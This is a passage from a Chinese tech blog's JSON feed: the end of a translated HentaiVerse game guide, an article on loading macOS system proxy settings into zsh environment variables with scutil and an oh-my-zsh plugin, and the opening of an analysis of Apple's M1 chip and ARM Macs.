级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 